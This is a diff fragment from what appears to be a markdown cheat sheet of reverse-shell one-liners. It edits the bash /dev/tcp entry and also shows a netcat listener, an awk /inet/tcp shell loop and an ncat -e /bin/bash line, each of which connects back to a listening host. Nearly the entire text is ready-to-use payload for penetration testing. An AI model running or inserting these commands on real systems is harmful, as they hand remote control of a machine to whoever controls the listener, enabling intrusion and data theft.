@@ -17,7 +17,7 @@ nc -u -lvp 4242
 
 ## Bash/Linux
 
-* shell script : `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
+* shell script : `/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'`
 * Awk : `awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
 * Ncat :
   *  `ncat 127.0.0.1 4444 -e /bin/bash` 
